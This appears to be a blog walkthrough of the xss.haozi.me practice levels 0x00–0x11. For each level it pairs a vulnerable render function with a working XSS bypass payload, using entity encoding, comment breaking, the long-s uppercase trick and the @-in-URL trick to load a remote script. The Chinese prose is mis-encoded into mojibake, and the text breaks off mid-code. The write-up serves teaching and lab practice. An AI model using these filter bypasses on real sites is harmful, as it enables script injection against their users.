<pre><code>type \\. \D:\ã€‚ã€‚ã€‚\aux.10.txt</code></pre>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/01/26/XSS%E9%9D%B6%E5%9C%BA%E5%90%88%E9%9B%86/">
                XSSé¶åœºåˆé›†
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-01-26</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h3 id="httpsï¼š-xss-haozi-me"><a href="#httpsï¼š-xss-haozi-me" class="headerlink" title="httpsï¼š//xss.haozi.me"></a>httpsï¼š//xss.haozi.me</h3><h5 id="0x00"><a href="#0x00" class="headerlink" title="#0x00"></a>#0x00</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  <span class="token keyword">return</span> <span class="token markup">&lt;div + input + /div></span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>ä»£ç åˆ†æï¼šæ— ä»»ä½•è¿‡æ»¤ã€‚</p>
<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
<h5 id="0x01"><a href="#0x01" class="headerlink" title="#0x01"></a>#0x01</h5><pre class=" language-PHP"><code class="language-PHP">function render (input) &#123;
  return <textarea + input + /textarea>
&#125;</code></pre>
<p>ä»£ç åˆ†æï¼šå†…å®¹ç”Ÿæ•ˆåœ¨æ ‡ç­¾å†…ï¼Œä¼šæ— æ•ˆã€‚æ‹¼æ¥ç»•è¿‡</p>
<pre class=" language-PHP"><code class="language-PHP"></textarea><script>alert(1)</script></code></pre>
<h5 id="0x02"><a href="#0x02" class="headerlink" title="#0x02"></a>#0x02</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  <span class="token keyword">return</span> <span class="token string">'&lt;input type="name" value="'</span> <span class="token operator">+</span> input <span class="token operator">+</span> <span class="token string">'">'</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>ä»£ç åˆ†æï¼šåŒä¸Šå…³ç›¸åŒï¼Œæ‹¼æ¥ç»•è¿‡ã€‚</p>
<pre><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
<h5 id="0x03"><a href="#0x03" class="headerlink" title="#0x03"></a>#0x03</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  <span class="token keyword">const</span> stripBracketsRe <span class="token operator">=</span> <span class="token operator">/</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">/</span>g
  input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>stripBracketsRe<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> input
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>ä»£ç åˆ†æï¼šè¿‡æ»¤äº†ï¼ˆï¼‰ï¼Œå¯ä»¥åˆ©ç”¨åå¼•å·ç»•è¿‡</p>
<pre><code>&lt;script&gt;alert`1`&lt;/script&gt;</code></pre>
<h5 id="0x04"><a href="#0x04" class="headerlink" title="#0x04"></a>#0x04</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  <span class="token keyword">const</span> stripBracketsRe <span class="token operator">=</span> <span class="token operator">/</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">)</span>`<span class="token punctuation">]</span><span class="token operator">/</span>g
  input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>stripBracketsRe<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> input
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>ä»£ç åˆ†æï¼šè¿‡æ»¤äº†ï¼ˆï¼‰å’Œ`ã€‚åˆ©ç”¨HTMLå®ä½“ç¼–ç ç»•è¿‡ã€‚</p>
<pre><code>&lt;img src=# onerror=alert&amp;#40;1&amp;#41;&gt;    
&lt;svg onload=&quot;alert&amp;#40;1&amp;#41;&quot;         
&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;</code></pre>
<p>ä¸Šé¢æ˜¯3ç§æ–¹æ³•ï¼Œå®ä½“ç¼–ç åªåœ¨htmlé‡Œä¼šç”Ÿæ•ˆï¼Œåœ¨JSæ— æ•ˆã€‚&lt;svg ä¼šè§£æè¿™ä¸ªå®ä½“ç¼–ç ã€‚</p>
<h5 id="0x05"><a href="#0x05" class="headerlink" title="#0x05"></a>#0x05</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'ğŸ˜‚'</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> <span class="token string">'&lt;!-- '</span> <span class="token operator">+</span> input <span class="token operator">+</span> <span class="token string">' -->'</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>ä»£ç åˆ†æï¼šè¿‡æ»¤äº†â€“&gt;,åœ¨HTMLæœ‰ä¸¤ç§æ³¨é‡Šæ–¹æ³•â€“&gt;å’Œâ€“!&gt;ã€‚</p>
<pre><code>--!&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
<h5 id="0x06"><a href="#0x06" class="headerlink" title="#0x06"></a>#0x06</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span>auto<span class="token operator">|</span>on<span class="token punctuation">.</span><span class="token operator">*</span><span class="token operator">=</span><span class="token operator">|</span><span class="token operator">></span><span class="token operator">/</span>ig<span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> `<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span>1</span> <span class="token attr-name">$&amp;#123;input&amp;#125;</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>`
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>ä»£ç åˆ†æï¼šè¿‡æ»¤äº†ä»¥autoæˆ–onå¼€å¤´ä»¥=ç»“å°¾ï¼Œå’Œ&gt;ã€‚å¯ä»¥é€šè¿‡æ¢è¡Œç»•è¿‡ã€‚</p>
<pre><code>type=&quot;image&quot; src=# onerror
=alert(1)</code></pre>
<h5 id="0x07"><a href="#0x07" class="headerlink" title="#0x07"></a>#0x07</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  <span class="token keyword">const</span> stripTagsRe <span class="token operator">=</span> <span class="token operator">/</span><span class="token markup">&lt;\/?[^></span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">/</span>gi

  input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>stripTagsRe<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> `<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>article</span><span class="token punctuation">></span></span></span>$<span class="token operator">&amp;</span><span class="token shell-comment comment">#123;input&amp;#125;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>article</span><span class="token punctuation">></span></span></span>`
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>ä»£ç åˆ†æï¼šè¿‡æ»¤äº†&lt;â€¦&gt;å’Œ&lt;/â€¦&gt;</p>
<pre><code>&lt;img src=&quot;#&quot; onerror=&quot;alert(1)&quot;
&lt;svg onload=&quot;alert(1)&quot;</code></pre>
<p>è¿™æ˜¯ä¸¤ç§æ–¹æ³•</p>
<h5 id="0x08"><a href="#0x08" class="headerlink" title="#0x08"></a>#0x08</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>src<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  src <span class="token operator">=</span> src<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token markup">&lt;\/style></span><span class="token operator">/</span>ig<span class="token punctuation">,</span> <span class="token string">'/* \u574F\u4EBA */'</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> `
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span></span>
      $<span class="token operator">&amp;</span><span class="token shell-comment comment">#123;src&amp;#125;</span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></span>
  `
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>ä»£ç åˆ†æï¼šè¿‡æ»¤äº†&lt;/styleã€‹,å¯ä»¥åˆ©ç”¨ç©ºæ ¼å’Œæ¢è¡Œç»•è¿‡</p>
<pre><code>&lt;/style &gt;&lt;script&gt;alert(1)&lt;/script&gt;

&lt;/style
&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
<h5 id="0x09"><a href="#0x09" class="headerlink" title="#0x09"></a>#0x09</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  let domainRe <span class="token operator">=</span> <span class="token operator">/</span><span class="token operator">^</span>https<span class="token operator">?</span><span class="token punctuation">:</span>\<span class="token operator">/</span>\<span class="token operator">/</span>www\<span class="token punctuation">.</span>segmentfault\<span class="token punctuation">.</span>com<span class="token operator">/</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>domainRe<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token keyword">return</span> `<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>$&amp;#123;input&amp;#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>`
  <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
  <span class="token keyword">return</span> <span class="token string">'Invalid URL'</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>ä»£ç åˆ†æï¼šå¿…é¡»è¦å«æœ‰httpï¼š//wwwã€‚segmentfault.comæ‰è¡Œ</p>
<pre><code>http://www.segmentfault.com/&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
<h5 id="0x0A"><a href="#0x0A" class="headerlink" title="#0x0A"></a>#0x0A</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  <span class="token keyword">function</span> <span class="token function">escapeHtml</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token operator">&amp;</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'&amp;amp;'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token string">'/g, '</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#39;')</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span>"<span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'&amp;quot;'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token operator">&lt;</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token operator">></span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span>\<span class="token operator">/</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'&amp;#x2f'</span><span class="token punctuation">)</span>
  <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

  <span class="token keyword">const</span> domainRe <span class="token operator">=</span> <span class="token operator">/</span><span class="token operator">^</span>https<span class="token operator">?</span><span class="token punctuation">:</span>\<span class="token operator">/</span>\<span class="token operator">/</span>www\<span class="token punctuation">.</span>segmentfault\<span class="token punctuation">.</span>com<span class="token operator">/</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>domainRe<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token keyword">return</span> `<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>$&amp;#123;escapeHtml(input)&amp;#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>`
  <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
  <span class="token keyword">return</span> <span class="token string">'Invalid URL'</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>ä»£ç åˆ†æï¼šè¿™ä¸ªè¿‡æ»¤è·Ÿæ²¡è¿‡æ»¤æ²¡åŒºåˆ«è¿˜å±äºhtmlæ ‡ç­¾å†…ï¼Œå®ä½“ç¼–ç ä¼šç”Ÿæ•ˆã€‚</p>
<pre><code>https://www.segmentfault.com@xss.haozi.me/j.js</code></pre>
<p>æ³¨ï¼šå¦‚æœä½ åœ¨æµè§ˆå™¨è¾“å…¥ä»¥ä¸‹å†…å®¹çœ‹çœ‹ä¼šè®¿é—®å“ªä¸ªç½‘é¡µ</p>
<pre><code>www.baidu.com@www.google.com</code></pre>
<h5 id="0x0B"><a href="#0x0B" class="headerlink" title="#0x0B"></a>#0x0B</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> `<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>$<span class="token operator">&amp;</span><span class="token shell-comment comment">#123;input&amp;#125;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>`
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>ä»£ç åˆ†æï¼šå°†å†…å®¹å¤§å†™</p>
<p>æ³¨ï¼šHTMLå¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼ŒJSå¯¹å¤§å°å†™æ•æ„Ÿã€‚æ‰€ä»¥å¯ä»¥é‡‡ç”¨å®ä½“ç¼–ç ç»•è¿‡</p>
<pre><code>&lt;img src=&quot;#&quot; onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&lt;h1&gt;</code></pre>
<h5 id="0x0C"><a href="#0x0C" class="headerlink" title="#0x0C"></a>#0x0C</h5><pre class=" language-PHP"><code class="language-PHP">function render (input) &#123;
  input = input.replace(/script/ig, '')
  input = input.toUpperCase()
  return <h1> + input + </h1>
&#125;</code></pre>
<p>ä»£ç åˆ†æï¼šå°±æ¯”ä¸Šå…³å¤šè¿‡æ»¤ä¸ªscript</p>
<pre><code>&lt;img src=&quot;#&quot; onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&lt;h1&gt;</code></pre>
<h5 id="0x0D"><a href="#0x0D" class="headerlink" title="#0x0D"></a>#0x0D</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">/</span>"<span class="token string">']/g, '</span>'<span class="token punctuation">)</span>
  <span class="token keyword">return</span> `
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>
          <span class="token comment" spellcheck="true">// alert('$&amp;#123;input&amp;#125;')</span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>
  `
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>ä»£ç åˆ†æï¼šè¿‡æ»¤äº†&lt; , / , â€œ , â€˜</p>
<p>æ³¨ï¼šJSä¸­ï¼Œâ€“&gt;ä¹Ÿä»£è¡¨æ³¨é‡Šï¼Œå…ˆæ¢è¡Œç»•è¿‡//å•è¡Œæ³¨é‡Š</p>
<pre><code>
alert(1)
--&gt;</code></pre>
<h5 id="0x0E-æˆ‘æ²¡æˆåŠŸï¼Œä½†æˆ‘ä¸ªäººè§‰å¾—åº”è¯¥å¯ä»¥çš„ï¼ï¼"><a href="#0x0E-æˆ‘æ²¡æˆåŠŸï¼Œä½†æˆ‘ä¸ªäººè§‰å¾—åº”è¯¥å¯ä»¥çš„ï¼ï¼" class="headerlink" title="#0x0E(æˆ‘æ²¡æˆåŠŸï¼Œä½†æˆ‘ä¸ªäººè§‰å¾—åº”è¯¥å¯ä»¥çš„ï¼ï¼)"></a>#0x0E(æˆ‘æ²¡æˆåŠŸï¼Œä½†æˆ‘ä¸ªäººè§‰å¾—åº”è¯¥å¯ä»¥çš„ï¼ï¼)</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">[</span>a<span class="token operator">-</span>zA<span class="token operator">-</span>Z<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'&lt;_$1'</span><span class="token punctuation">)</span>
  input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> <span class="token string">'&lt;h1>'</span> <span class="token operator">+</span> input <span class="token operator">+</span> <span class="token string">'&lt;/h1>'</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>ä»£ç åˆ†æï¼šè¿‡æ»¤äº†&lt;å¼€å¤´ä¸‹ä¸ªæ˜¯å­—æ¯çš„æ‰€æœ‰å†…å®¹ã€‚</p>
<p>æ³¨ï¼šÅ¿ è¢«å¤§å†™åå°±æ˜¯S</p>
<pre><code>&lt;Å¿cript src=&quot;https://xss.haozi.me/j.js&quot;&gt;&lt;/script&gt;</code></pre>
<h5 id="0x0F"><a href="#0x0F" class="headerlink" title="#0x0F"></a>#0x0F</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  <span class="token keyword">function</span> <span class="token function">escapeHtml</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token operator">&amp;</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'&amp;amp;'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token string">'/g, '</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#39;')</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span>"<span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'&amp;quot;'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token operator">&lt;</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token operator">></span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span>\<span class="token operator">/</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'&amp;#x2f;'</span><span class="token punctuation">)</span>
  <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
  <span class="token keyword">return</span> `<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>console.error(<span class="token punctuation">'</span>$&amp;#123;escapeHtml(input)&amp;#125;<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>`
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>ä»£ç åˆ†æï¼šè¿™ä¸ªè¿‡æ»¤ä¹Ÿè·Ÿæ²¡è¿‡æ»¤ä¸€æ ·ï¼ˆä»£ç ç”Ÿæ•ˆåœ°æ–¹ï¼‰ï¼Œä¸»è¦å°±æ˜¯æ‹¼æ¥ã€‚</p>
<pre><code>1&#39;);alert(1);(&#39;</code></pre>
<h5 id="0x10"><a href="#0x10" class="headerlink" title="#0x10"></a>#0x10</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  <span class="token keyword">return</span> `
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>
  window<span class="token punctuation">.</span>data <span class="token operator">=</span> $<span class="token operator">&amp;</span><span class="token shell-comment comment">#123;input&amp;#125;</span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>
  `
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>ä»£ç åˆ†æï¼šè¿™å…³å°±ä¸åˆ†æ</p>
<pre><code>1;alert(1)</code></pre>
<h5 id="0x11"><a href="#0x11" class="headerlink" title="#0x11"></a>#0x11</h5><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">// from alf.nu</span>
<span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  <span class="token keyword">function</span> <span class="token function">escapeJs</span> <span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token keyword">return</span> <span class="token function">String</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span>\<span class="token package"><span class="token punctuation">\</span></span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'\\\\'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token string">'/g, '</span>\<span class="token package"><span class="token punctuation">\</span><span class="token punctuation">\</span></span><span class="token string">''</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token string">"/g, '\\"</span>'<span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span>`<span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'\\`'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token operator">&lt;</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'\\74'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token operator">></span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'\\76'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span>\<span class="token operator">/</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'\\/'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span>\<span class="token package">n</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'\\n'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span>\<span class="token package">r</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'\\r'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span>\<span class="token package">t</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'\\t'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span>\<span class="token package">f</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'\\f'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span>\<span class="token package">v</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'\\v'</span><span class="token punctuation">)</span>
            <span class="token comment" spellcheck="true">// .replace(/\b/g, '\\b')</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span>\<span class="token package">0</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'\\0'</span><span class="token punctuation">)</span>
  <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
  s <span class="token operator">=</span> <span class="token function">escapeJs</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
  <span class="token keyword">return</span> `

<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>
  <span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token string">'javascript:console.log("$&amp;#123;s&amp;#125;")'</span>
